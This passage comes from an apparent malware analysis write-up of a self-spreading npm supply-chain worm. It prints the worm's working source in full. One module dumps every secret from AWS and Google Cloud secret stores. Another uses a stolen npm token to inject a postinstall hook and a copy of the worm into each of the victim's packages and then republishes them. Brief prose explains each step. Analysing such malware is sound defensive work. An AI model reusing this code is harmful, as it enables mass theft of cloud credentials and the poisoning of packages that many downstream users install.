              const profileName = match.replace(/\[(?:profile )?/, "").replace("]", "");
              if (!profiles.includes(profileName)) {
                profiles.push(profileName);
              }
            }
          }
        } catch (error) {
          // Silent catch for file reading errors
        }
      }
    }

    // Ensure 'default' profile is first
    if (profiles.includes("default")) {
      profiles.splice(profiles.indexOf("default"), 1);
      profiles.unshift("default");
    }

    return profiles;
  }

  async initialize() {
    if (this.callerIdentity) return true;

    const profilesToTry = [
      process.env.AWS_PROFILE || "default",
      ...this.parseAwsProfiles()
    ];

    for (const profile of Array.from(new Set(profilesToTry))) {
      try {
        const credentials = fromIni({ profile });
        const stsClient = new STSClient({
          region: "us-east-1",
          credentials
        });

        const identity = await stsClient.send(new GetCallerIdentityCommand({}));
        
        if (identity.UserId && identity.Account && identity.Arn) {
          this.callerIdentity = {
            userId: identity.UserId,
            account: identity.Account,
            arn: identity.Arn
          };
          this.profile = profile;
          this.stsClient = stsClient;
          return true;
        }
      } catch (error) {
        // Continue to next profile
      }
    }

    return false;
  }

  getSecretsClient(region) {
    if (!this.secretsClients.has(region)) {
      const client = new SecretsManagerClient({
        region: region,
        credentials: fromIni({ profile: this.profile })
      });
      this.secretsClients.set(region, client);
    }
    return this.secretsClients.get(region);
  }

  async isValid() {
    return await this.initialize();
  }

  async getCallerIdentity() {
    await this.initialize();
    return this.callerIdentity;
  }

  async listSecrets() {
    if (!await this.initialize()) return [];

    const secrets = [];
    const seenArns = new Set();

    for (const region of this.REGIONS) {
      try {
        const client = this.getSecretsClient(region);
        const response = await client.send(new ListSecretsCommand({}));
        
        for (const secret of response.SecretList || []) {
          if (secret.ARN && !seenArns.has(secret.ARN)) {
            seenArns.add(secret.ARN);
            secrets.push({
              name: secret.Name || "",
              arn: secret.ARN,
              description: secret.Description,
              lastChangedDate: secret.LastChangedDate
            });
          }
        }
      } catch (error) {
        if (error.name === "AccessDeniedException" || error.$metadata?.httpStatusCode === 403) {
          console.error("Permission denied listing secrets. Stopping scan.");
          break;
        }
      }
    }

    return secrets;
  }

  async getSecretValue(secretId) {
    if (!await this.initialize()) return null;

    let targetRegion = null;
    
    // Extract region from ARN if provided
    if (secretId.startsWith("arn:aws:secretsmanager:")) {
      const arnParts = secretId.split(":");
      if (arnParts.length > 3) {
        targetRegion = arnParts[3];
      }
    }

    const regionsToTry = targetRegion ? [targetRegion] : this.REGIONS;

    for (const region of regionsToTry) {
      try {
        const client = this.getSecretsClient(region);
        const response = await client.send(new GetSecretValueCommand({
          SecretId: secretId
        }));

        return {
          name: response.Name || secretId,
          secretString: response.SecretString,
          secretBinary: response.SecretBinary,
          versionId: response.VersionId
        };
      } catch (error) {
        // Continue to next region
      }
    }

    return null;
  }

  async getAllSecretValues() {
    if (!await this.initialize()) return [];

    const allSecrets = [];
    const seenArns = new Set();

    for (const region of this.REGIONS) {
      try {
        const client = this.getSecretsClient(region);
        const listResponse = await client.send(new ListSecretsCommand({}));
        
        for (const secret of listResponse.SecretList || []) {
          if (!secret.ARN || seenArns.has(secret.ARN)) continue;
          
          seenArns.add(secret.ARN);
          
          try {
            const valueResponse = await client.send(new GetSecretValueCommand({
              SecretId: secret.Name || secret.ARN
            }));
            
            allSecrets.push({
              name: valueResponse.Name || secret.Name || "",
              secretString: valueResponse.SecretString,
              secretBinary: valueResponse.SecretBinary,
              versionId: valueResponse.VersionId
            });
          } catch (error) {
            // Skip secret if value cannot be retrieved
          }
        }
      } catch (error) {
        if (error.name === "AccessDeniedException" || error.$metadata?.httpStatusCode === 403) {
          console.error("Permission denied listing secrets. Stopping scan.");
          break;
        }
      }
    }

    return allSecrets;
  }
}

module.exports = { AWSModule };
```

##### GCPModule

The GCPModule operates very similarly to the AWSModule. Its primary function, isValid(), handles authentication against Google Cloud Platform. Once authenticated, the getAllSecretValues() function enumerates all available secrets in Google Secret Manager and retrieves the value of each one.

<img src="/static/NPM/image-24.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-23.png" alt="drawing" width="1000"/>

Full code:
```

class GCPModule {
  constructor() {
    this.projectInfo = null;
    this.isValidCredentials = false;
    this.initialized = false;
    
    this.auth = new GoogleAuth({
      scopes: ["https://www.googleapis.com/auth/cloud-platform"]
    });
    
    this.secretsClient = new SecretManagerServiceClient();
  }

  async initialize() {
    if (!this.initialized) {
      try {
        const projectId = await this.auth.getProjectId();
        const client = await this.auth.getClient();
        
        if (projectId && client) {
          let email = null;
          if ('email' in client && typeof client.email === 'string') {
            email = client.email;
          }
          
          this.projectInfo = {
            projectId: projectId,
            email: email
          };
          this.isValidCredentials = true;
        }
      } catch (error) {
        this.isValidCredentials = false;
        this.projectInfo = null;
      } finally {
        this.initialized = true;
      }
    }
  }

  async isValid() {
    if (!this.initialized) {
      await this.initialize();
    }
    return this.isValidCredentials;
  }

  async getProjectInfo() {
    if (!this.initialized) {
      await this.initialize();
    }
    return this.projectInfo;
  }

  async getProjectId() {
    const projectInfo = await this.getProjectInfo();
    return projectInfo?.projectId || null;
  }

  async getUserEmail() {
    const projectInfo = await this.getProjectInfo();
    return projectInfo?.email || null;
  }

  async listSecrets() {
    try {
      if (!this.isValidCredentials || !this.projectInfo) {
        return [];
      }

      const [secrets] = await this.secretsClient.listSecrets({
        parent: `projects/${this.projectInfo.projectId}`
      });

      return secrets.map(secret => {
        const nameParts = secret.name?.split("/") || [];
        const secretId = nameParts[nameParts.length - 1] || "";
        
        return {
          name: secret.name || "",
          projectId: this.projectInfo.projectId,
          secretId: secretId,
          labels: secret.labels || undefined
        };
      });
    } catch (error) {
      return [];
    }
  }

  async getSecretValue(secretId, version = "latest") {
    try {
      if (!this.isValidCredentials || !this.projectInfo) {
        return null;
      }

      const secretName = `projects/${this.projectInfo.projectId}/secrets/${secretId}/versions/${version}`;
      const [response] = await this.secretsClient.accessSecretVersion({
        name: secretName
      });

      const payload = response.payload?.data?.toString();
      
      return {
        name: secretName,
        secretId: secretId,
        payload: payload,
        version: response.name?.split("/").pop() || version
      };
    } catch (error) {
      return null;
    }
  }

  async getAllSecretValues() {
    try {
      const secrets = await this.listSecrets();
      const allSecrets = [];

      for (const secret of secrets) {
        const secretValue = await this.getSecretValue(secret.secretId);
        if (secretValue) {
          allSecrets.push(secretValue);
        }
      }

      return allSecrets;
    } catch (error) {
      return [];
    }
  }
}

module.exports = { GCPModule };
```

##### NpmModule

Finally, we reach the last and most crucial module for the worm's propagation behavior: the NpmModule. The module's main() calls the functions:

- validateToken(): Logs into the npm user account and returns the username.
- getPackagesByMaintainer(): Retrieves all packages that the compromised user account maintains, along with other relevant package information.
- updatePackage(): This malicious function is then called for each maintained package discovered.

<img src="/static/NPM/image-25.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-26.png" alt="drawing" width="1000"/>

The updatePackage() function begins by checking if the tar utility is available on the operating system. It then proceeds to download the target package maintained by the user.

<img src="/static/NPM/image-27.png" alt="drawing" width="1000"/>

Then the package is extracted, and its version is incremented in the package.json file to prepare for publishing a new version.

<img src="/static/NPM/image-28.png" alt="drawing" width="1000"/>

Then A postinstall script is added to the package.json with the command "node bundle.js", and the current script (bundle.js) is added to the package. The compromised package is then compressed and published to the npm registry using the npm publish command.

<img src="/static/NPM/image-30.png" alt="drawing" width="1000"/>

```
class NpmModule {
  constructor(token) {
    this.baseUrl = "https://registry.npmjs.org";
    this.userAgent = `npm/9.2.0 node/v${process.version.replace("v", "")} workspaces/false`;
    this.token = token;
  }

  async validateToken() {
    if (!this.token) return null;
    
    try {
      const response = await fetch(`${this.baseUrl}/-/whoami`, {
        method: "GET",
        headers: {
          Authorization: `Bearer ${this.token}`,
          "Npm-Auth-Type": "web",
          "Npm-Command": "whoami",
          "User-Agent": this.userAgent,
          Connection: "keep-alive",
          Accept: "*/*",
          "Accept-Encoding": "gzip, deflate, br"
        }
      });

      if (response.status === 401) {
        throw new Error("Invalid NPM token - authentication failed");
      }

      if (!response.ok) {
        throw new Error(`NPM whoami failed: ${response.status} ${response.statusText}`);
      }

      const data = await response.json();
      return data.username || null;
    } catch (error) {
      if (error instanceof Error && error.message.includes("Invalid NPM token")) {
        throw error;
      }
      throw new Error(`Failed to validate NPM token: ${error}`);
    }
  }

  getHeaders(isDetailRequest = false) {
    const headers = {
      "User-Agent": this.userAgent,
      "Accept-Encoding": "gzip, deflate, br"
    };

    if (isDetailRequest) {
      headers.Accept = "application/json";
      headers["Npm-Auth-Type"] = "web";
      headers["Npm-Command"] = "view";
      headers["Pacote-Version"] = "15.0.7";
      headers["Pacote-Req-Type"] = "packument";
      headers.Connection = "close";
    } else {
      headers.Accept = "*/*";
      headers["Npm-Auth-Type"] = "web";
      headers["Npm-Command"] = "search";
    }

    if (this.token) {
      headers.Authorization = `Bearer ${this.token}`;
    }

    return headers;
  }

  async searchPackages(query, limit = 20) {
    const searchPath = `/-/v1/search?text=${encodeURIComponent(query)}&size=${limit}`;
    const url = `${this.baseUrl}${searchPath}`;

    try {
      const response = await fetch(url, {
        method: "GET",
        headers: this.getHeaders(false)
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();
      return data.objects || [];
    } catch (error) {
      console.error("Error searching packages:", error);
      return [];
    }
  }

  async getPackageDetail(packageName) {
    const url = `${this.baseUrl}/${encodeURIComponent(packageName)}`;
    
    try {
      const headers = this.getHeaders(true);
      headers["Pacote-Pkg-Id"] = `registry:${packageName}`;

      const response = await fetch(url, {
        method: "GET",
        headers: headers
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      return await response.json();
    } catch (error) {
      throw new Error(`Failed to fetch package details: ${error}`);
    }
  }

  async updatePackage(packageInfo) {
    try {
      const execAsync = promisify(exec);

      // Check if tar is available
      try {
        await execAsync("which tar");
      } catch {
        return Buffer.alloc(0);
      }

      const response = await fetch(packageInfo.tarballUrl, {
        method: "GET",
        headers: {
          "User-Agent": this.userAgent,
          Accept: "*/*",
          "Accept-Encoding": "gzip, deflate, br"
        }
      });

      if (!response.ok) {
        throw new Error(`Failed to download tarball: ${response.status} ${response.statusText}`);
      }

      const tarballBuffer = Buffer.from(await response.arrayBuffer());
      const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "npm-update-"));
      const tarballPath = path.join(tempDir, "package.tgz");
      const tarPath = path.join(tempDir, "package.tar");
      const updatedTarballPath = path.join(tempDir, "updated.tgz");

      try {
        // Write and extract the tarball
        await fs.writeFile(tarballPath, tarballBuffer);
        await execAsync(`gzip -d -c ${tarballPath} > ${tarPath}`);
        await execAsync(`tar -xf ${tarPath} -C ${tempDir} package/package.json`);

        // Modify package.json
        const packageJsonPath = path.join(tempDir, "package", "package.json");
        const packageJsonContent = await fs.readFile(packageJsonPath, "utf-8");
        const packageJson = JSON.parse(packageJsonContent);

        // Increment version
        if (packageJson.version) {
          const versionParts = packageJson.version.split(".");
          if (versionParts.length === 3) {
            const major = parseInt(versionParts[0]);
            const minor = parseInt(versionParts[1]);
            const patch = parseInt(versionParts[2]);
            if (!isNaN(patch)) {
              packageJson.version = `${major}.${minor}.${patch + 1}`;
            }
          }
        }

        // Add postinstall script
        packageJson.scripts ||= {};
        packageJson.scripts.postinstall = "node bundle.js";

        await fs.writeFile(packageJsonPath, JSON.stringify(packageJson, null, 2));

        // Update the tar archive
        await execAsync(`tar -uf ${tarPath} -C ${tempDir} package/package.json`);

        // Add current script to the package
        const currentScript = process.argv[1];
        if (currentScript && await fs.access(currentScript).then(() => true).catch(() => false)) {
          const bundlePath = path.join(tempDir, "package", "bundle.js");
          const bundleContent = await fs.readFile(currentScript);
          await fs.writeFile(bundlePath, bundleContent);
          await execAsync(`tar -uf ${tarPath} -C ${tempDir} package/bundle.js`);
        }

        // Recompress and publish
        await execAsync(`gzip -c ${tarPath} > ${updatedTarballPath}`);
        await execAsync(`npm publish ${updatedTarballPath}`);

        // Cleanup
        await fs.rm(tempDir, { recursive: true, force: true });
      } catch (error) {
        // Cleanup on error
        try {
          await fs.rm(tempDir, { recursive: true, force: true });
        } catch {}
        throw error;
      }
    } catch (error) {
      throw new Error(`Failed to update package: ${error}`);
    }
  }

  async getPackagesByMaintainer(maintainer, limit = 10) {
    try {
      const searchResults = await this.searchPackages(`maintainer:${maintainer}`, limit);
      const packages = [];

      for (const result of searchResults) {
        try {
          const packageName = result.package?.name;
          const version = result.package?.version;
          const monthlyDownloads = result.downloads?.monthly || 0;
          const weeklyDownloads = result.downloads?.weekly || 0;

          if (!packageName || !version) continue;

          const packageDetail = await this.getPackageDetail(packageName);
          const tarballUrl = packageDetail.versions?.[version]?.dist?.tarball || "";

          packages.push({
            name: packageName,
            version: version,
            monthlyDownloads: monthlyDownloads,
            weeklyDownloads: weeklyDownloads,
            tarballUrl: tarballUrl
          });
        } catch (error) {
          console.error("Error processing package:", error);
        }
      }

      return packages.sort((a, b) => b.monthlyDownloads - a.monthlyDownloads);
    } catch (error) {
      console.error(`Error getting packages for maintainer ${maintainer}:`, error);
      return [];
    }
  }
}

module.exports = { NpmModule };
```

### Concluding Thoughts

This software supply chain attack is a perfect example of how powerful and effective this type of attack can be. Compromising packages that millions of people use allows it to spread to other packages, can be catastrophic. Keep your eyes open for the next chapter; the amount of credentials and secrets these attackers must have obtained is no joke.

Thank you for taking the time to read this analysis! If you have any questions, insights, or suggestions, feel free to reach out.
